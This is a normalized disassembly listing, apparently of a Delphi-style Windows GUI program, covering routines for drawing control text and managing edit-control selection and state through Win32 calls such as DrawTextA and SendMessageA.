lea ecx [ ebp - 0x4c ]
pop edx
call sub_433c58
push 0x0
mov eax edi
call sub_4249b8
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_442bb8
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_444e98
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_442bb8
mov eax [ ebp - 0x80 ]
call sub_4042c8
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_442bb8
mov eax [ ebp - 0x84 ]
call sub_4044c8
push eax
mov eax edi
call sub_4249b8
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_424270
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_442bb8
mov eax [ ebp - 0x88 ]
call sub_4042c8
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_442bb8
mov eax [ ebp - 0x8c ]
call sub_4044c8
push eax
mov eax edi
call sub_4249b8
push eax
call DrawTextA
sub_438d0f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_438d8a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442bb8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45997c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_448824
mov eax ebx
mov si 0xffb8
call sub_403430
test al al
je r-xdata
mov eax ebx
call sub_449938
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438d91
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_438ddc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44a600
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_442374
mov edx 0x11
mov eax esi
call sub_442398
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_433abc
call sub_433b9c
test al al
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_438e88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_438fde
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_444e98
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_4248d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4042d0
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x160 ]
call sub_4249b8
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423aa4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x160 ]
call sub_4249b8
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_423aa4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x160 ]
call sub_4249b8
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438fe5
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_438fef
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_439218
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_42438c
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_424270
xor edx edx
mov eax [ esi + 0x14 ]
call sub_42438c
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_424614
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403430
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403430
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_439110
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_424a38
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403430
xor edx edx
mov eax [ edi + 0x160 ]
call sub_424a38
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403430
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_43f998
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_439254
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_439218
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4392b4
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403430
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4392dc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_442088
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_439340
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4393cd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4393d4
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442bb8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45997c
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403430
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_439424
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4450cc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_442374
mov edx 0x19
mov eax esi
call sub_442398
mov dl 0x1
mov eax esi
call sub_44960c
xor edx edx
mov eax esi
call sub_442d7c
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_439b34
mov eax esi
test bl bl
je r-xdata
sub_4394cc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43954c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_4496dc
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_439590
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_4496dc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_4493d8
push eax
call SendMessageA
test eax eax
setne bl
sub_4395c8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4496dc
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_4493d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_439600
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43967d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439684
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_4496dc
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442bb8
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov edx eax
mov eax ebx
call sub_442b94
sub_439688
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_4496dc
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_4493d8
push eax
call SendMessageA
sub_4396c4
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4396e8
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_439708
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_439738
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4397d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_442b2c
inc eax
call sub_408b80
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43985e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408b94
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_442b3c
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4089f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439865
mov eax [ ebp - 0xc ]
call sub_408bcc
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_439870
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_4040f8
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_442b2c
inc eax
call sub_408b80
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4398fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408b94
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_442b3c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_402998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408bcc
retn
sub_43990c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44622c
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_446158
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_4399c5
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_446528
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_446528
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_439a38
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_439a77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_446358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439a7e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_439a7e
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_4395c8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_439af8
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call SendMessageA
sub_439af8
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_439b34
pop ebx
retn
sub_439b34
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_423ab8
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_442398
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_439c00
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_446f18
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_439c38
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_4493d8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_4493d8
push eax
call SendMessageA
sub_439c78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4489b8
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_439af8
mov eax ebx
call sub_446940
sub_439cac
push ebx
mov ebx eax
mov eax ebx
call sub_4488fc
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_439b34
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_439cf4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_448754
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_4493d8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_4397b8
sub_439d30
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4496dc
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403430
push 0xfffffff0
mov eax esi
call sub_4493d8
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_439d68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_44a4b8
pop esi
pop ebx
retn
sub_439d84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445098
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_439da8
push ebx
mov ebx eax
mov eax ebx
call sub_44f1a0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_439de0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_439e36
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_439e44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4450cc
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_439e98
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_449ea8
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_439eec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_439f10
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_446db4
mov eax ebx
mov si 0xffb5
call sub_403430
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_4493d8
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403430
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_439f88
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_433abc
mov ebx eax
mov eax ebx
call sub_433b9c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4493d8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_433c9c
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_439fd4
push ebx
push esi
mov esi edx
mov ebx eax
call sub_433abc
call sub_433b9c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4477f4
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_43a000
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44622c
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_43a038
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_439e44
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_442374
mov edx 0x19
mov eax esi
call sub_442398
mov dl 0x1
mov eax esi
call sub_44960c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_43a0c4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_4496dc
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_4493d8
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_4493d8
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_43a118
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_4496dc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4599ec
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_443d6c
sub_43a14c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a000
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_446158
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_43a1b4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_44881c
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4598f4
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403430
test al al
